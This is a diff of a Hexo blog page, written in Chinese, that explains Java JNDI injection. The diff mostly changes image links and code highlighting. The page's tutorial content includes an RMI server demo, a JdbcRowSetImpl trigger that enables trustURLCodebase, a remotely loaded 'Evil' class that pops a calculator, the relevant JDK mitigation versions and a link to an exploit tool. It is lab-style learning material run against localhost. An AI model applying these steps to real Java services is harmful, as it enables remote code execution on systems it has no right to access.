@@ -17,29 +17,29 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="JNDI注入JNDI全称为Java Naming and Directory Interface（Java命名和目录接口），是SUN公司提供的一种标准的Java命名系统接口 命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务 目录服务通常使用树状结构来组织信息，LDAP是典型的目录服务，Active Directory是LDAP在Windows上的实现，OpenLDAP">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e1d4c512-fba3-47ba-b588-4a058f6f9e09/Untitled.png">
-<meta property="og:image" content="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/702185f1-de30-4abe-b9fa-b316a9e95df1/Untitled.png">
-<meta property="og:image" content="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/48e85a09-e1a0-49c5-b6ba-05b0f90a0705/Untitled.png">
-<meta property="og:image" content="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d86c475c-7637-4df3-889d-40d34d09f49b/Untitled.png">
-<meta property="og:image" content="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f5011c7b-861e-4100-b132-1deac15d66fa/Untitled.png">
+<meta property="og:image" content="https://0xr1ngs.github.io/2023/06/19/Java-Jndi/1.png">
+<meta property="og:image" content="https://0xr1ngs.github.io/2023/06/19/Java-Jndi/2.png">
+<meta property="og:image" content="https://0xr1ngs.github.io/2023/06/19/Java-Jndi/3.png">
+<meta property="og:image" content="https://0xr1ngs.github.io/2023/06/19/Java-Jndi/4.png">
+<meta property="og:image" content="https://0xr1ngs.github.io/2023/06/19/Java-Jndi/5.png">
 <meta property="article:published_time" content="2023-06-19T11:21:26.000Z">
-<meta property="article:modified_time" content="2023-06-19T11:40:43.218Z">
+<meta property="article:modified_time" content="2023-06-19T11:57:03.890Z">
 <meta property="article:author" content="r1ngs">
 <meta property="article:tag" content="Java">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e1d4c512-fba3-47ba-b588-4a058f6f9e09/Untitled.png">
+<meta name="twitter:image" content="https://0xr1ngs.github.io/2023/06/19/Java-Jndi/1.png">
     
 <link rel="stylesheet" href="/lib/fancybox/fancybox.css">
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1687175380856">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1687175845631">
     
-    <link rel="stylesheet" href="/css/style.css?v=1687175380856">
+    <link rel="stylesheet" href="/css/style.css?v=1687175845631">
 
     
         
-            <link rel="stylesheet" href="/custom.css?v=1687175380856">
+            <link rel="stylesheet" href="/custom.css?v=1687175845631">
         
     
 
@@ -48,7 +48,7 @@
 <script src="/lib/fancybox/fancybox.umd.js" async></script>
 
 
-    <script async src="/js/app.js?v=1687175380856"></script>
+    <script async src="/js/app.js?v=1687175845631"></script>
     
      
 
@@ -239,32 +239,32 @@
     <h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>JNDI全称为Java Naming and Directory Interface（Java<strong>命名和目录</strong>接口），是SUN公司提供的一种标准的Java命名系统接口</p>
 <p><strong>命名服务</strong>是一种简单的键值对绑定，可以通过键名检索值，<strong>RMI</strong>就是典型的命名服务</p>
 <p><strong>目录服务</strong>通常使用树状结构来组织信息，<strong>LDAP</strong>是典型的目录服务，<strong>Active Directory</strong>是LDAP在Windows上的实现，<strong>OpenLDAP</strong> 是在 Linux 上的实现</p>
-<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e1d4c512-fba3-47ba-b588-4a058f6f9e09/Untitled.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2023/06/19/Java-Jndi/1.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
 <h2 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI_RMI"></a>JNDI_RMI</h2><p>服务端：</p>
-<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">package org.RmiDemo;
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span></span><span class="token class-name">RmiDemo</span><span class="token punctuation">;</span>
 
-import java.rmi.Naming;
-import java.rmi.RemoteException;
-import java.rmi.registry.LocateRegistry;
-import java.rmi.server.UnicastRemoteObject;
-public class Server &#123;
-    public static class RMIInstance extends UnicastRemoteObject implements IHello&#123;
-        &#x2F;&#x2F; 绑定到RMI的对象的类必须要继承自UnicastRemoteObject，并且要实现一个继承自java.rmi.Remote的接口
-        &#x2F;&#x2F; 构造方法
-        protected RMIInstance() throws RemoteException &#123;
-        &#125;
-        &#x2F;&#x2F; 实现接口
-        @Override
-        public String sayHello(String name) throws RemoteException &#123;
-            return &quot;hello, &quot; + name;
-        &#125;
-    &#125;
-    public static void main(String[] args) throws Exception &#123;
-        LocateRegistry.createRegistry(1099);
-        RMIInstance rmiInstance &#x3D; new RMIInstance();
-        Naming.bind(&quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;hello&quot;,rmiInstance);
-    &#125;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">UnicastRemoteObject</span></span><span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Server</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">RMIInstance</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">IHello</span><span class="token punctuation">&#123;</span>
+        <span class="token comment">// 绑定到RMI的对象的类必须要继承自UnicastRemoteObject，并且要实现一个继承自java.rmi.Remote的接口</span>
+        <span class="token comment">// 构造方法</span>
+        <span class="token keyword">protected</span> <span class="token class-name">RMIInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">&#123;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token comment">// 实现接口</span>
+        <span class="token annotation punctuation">@Override</span>
+        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token string">"hello, "</span> <span class="token operator">+</span> name<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">RMIInstance</span> rmiInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RMIInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Naming</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1/hello"</span><span class="token punctuation">,</span>rmiInstance<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>接口：</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span></span><span class="token class-name">RmiDemo</span><span class="token punctuation">;</span>
@@ -371,13 +371,13 @@ public class Server &#123;
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后用同版本（否则会报 <code>Unsupported major.minor</code>）jdk编译：<code>javac [Evil.java](&lt;http://Evil.java&gt;)</code> ，将其放入 <code>http://127.0.0.1:8888</code> 目录下，运行客户端代码即可弹出两次计算器（虽然会报 <code>Evil cannot be cast to javax.naming.spi.ObjectFactory</code> 但代码还是执行了）。</p>
-<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/702185f1-de30-4abe-b9fa-b316a9e95df1/Untitled.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2023/06/19/Java-Jndi/2.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
 <blockquote>
 <p>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
 <p>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</p>
 <p>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</p>
 </blockquote>
-<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/48e85a09-e1a0-49c5-b6ba-05b0f90a0705/Untitled.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2023/06/19/Java-Jndi/3.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
 <h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>通过JdbcRowSetImpl也能触发：</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span></span><span class="token class-name">RmiDemo</span><span class="token punctuation">;</span>
 
@@ -385,7 +385,7 @@ public class Server &#123;
 
 <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
-				<span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.ldap.object.trustURLCodebase"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.ldap.object.trustURLCodebase"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token class-name">JdbcRowSetImpl</span> <span class="token class-name">JdbcRowSetImpl_inc</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JdbcRowSetImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token class-name">JdbcRowSetImpl_inc</span><span class="token punctuation">.</span><span class="token function">setDataSourceName</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1/hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token class-name">JdbcRowSetImpl_inc</span><span class="token punctuation">.</span><span class="token function">setAutoCommit</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -393,8 +393,8 @@ public class Server &#123;
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>触发点在setAutoCommit，参数是true还是false没有影响。</p>
-<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d86c475c-7637-4df3-889d-40d34d09f49b/Untitled.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
-<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f5011c7b-861e-4100-b132-1deac15d66fa/Untitled.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2023/06/19/Java-Jndi/4.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2023/06/19/Java-Jndi/5.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
 <p>实验环境为 <code>jdk 1.8.0_202</code>，由于trustURLCodebase为false，如果不手动开启的话会报错：<code>Exception in thread &quot;main&quot; java.lang.ClassCastException: javax.naming.Reference cannot be cast to javax.sql.DataSource</code></p>
 <p>快速搭建JNDI环境：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
@@ -467,7 +467,7 @@ logger<span class="token punctuation">.</span><span class="token function">error
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1687175380849"></script>
+    <script async src="/js/copy-codeblock.js?v=1687175845624"></script>
   
 
   
